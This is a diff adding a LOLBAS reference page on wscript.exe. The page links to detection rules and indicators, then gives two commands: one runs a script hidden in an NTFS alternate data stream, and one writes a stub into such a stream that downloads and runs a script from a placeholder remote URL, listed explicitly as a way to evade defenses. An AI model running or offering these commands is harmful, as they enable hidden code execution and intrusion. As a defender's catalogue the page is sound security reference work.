@@ -1,0 +1,66 @@
+---
+title: "Wscript.exe"
+source: lolbas-project.github.io
+source_url: https://lolbas-project.github.io/lolbas/Binaries/Wscript/
+fetched_at: 2026-09-20T17:12:05Z
+license: unspecified
+category: windows
+---
+
+Used by Windows to execute scripts
+
+## Paths
+- C:\Windows\System32\wscript.exe
+- C:\Windows\SysWOW64\wscript.exe
+
+## Resources
+- [https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)
+
+## Acknowledgements
+- Oddvar Moe ([@oddvarmoe](https://twitter.com/@oddvarmoe))
+- SaiLay(valen) ([@404death](https://twitter.com/@404death))
+
+## Detections
+- Sigma: [https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_wscript_cscript_script_exec.yml](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_wscript_cscript_script_exec.yml)
+- Sigma: [https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/file/file_event/file_event_win_net_cli_artefact.yml](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/file/file_event/file_event_win_net_cli_artefact.yml)
+- Sigma: [https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/image_load/image_load_susp_script_dotnet_clr_dll_load.yml](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/image_load/image_load_susp_script_dotnet_clr_dll_load.yml)
+- Elastic: [https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_unusual_dir_ads.toml](https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_unusual_dir_ads.toml)
+- Elastic: [https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/command_and_control_remote_file_copy_scripts.toml](https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/command_and_control_remote_file_copy_scripts.toml)
+- Elastic: [https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml](https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml)
+- Splunk: [https://github.com/splunk/security_content/blob/a1afa0fa605639cbef7d528dec46ce7c8112194a/detections/endpoint/wscript_or_cscript_suspicious_child_process.yml](https://github.com/splunk/security_content/blob/a1afa0fa605639cbef7d528dec46ce7c8112194a/detections/endpoint/wscript_or_cscript_suspicious_child_process.yml)
+- BlockRule: [https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules)
+- IOC: Wscript.exe executing code from alternate data streams
+- IOC: DotNet CLR libraries loaded into wscript.exe
+- IOC: DotNet CLR Usage Log - wscript.exe.log
+
+## Alternate data streams
+
+1. Execute script stored in an alternate data stream
+
+```
+wscript //e:vbscript {PATH}:script.vbs
+```
+
+   - Use case: Execute hidden code to evade defensive counter measures
+
+   - Privileges required: User
+
+   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+
+   - ATT&CK® technique: T1564.004
+
+   - Tags: Execute: WSH
+
+2. Download and execute script stored in an alternate data stream
+
+```
+echo GetObject("script:{REMOTEURL:.js}") > {PATH_ABSOLUTE}:hi.js && wscript.exe {PATH_ABSOLUTE}:hi.js
+```
+
+   - Use case: Execute hidden code to evade defensive counter measures
+
+   - Privileges required: User
+
+   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+
+   - ATT&CK® technique: T1564.004
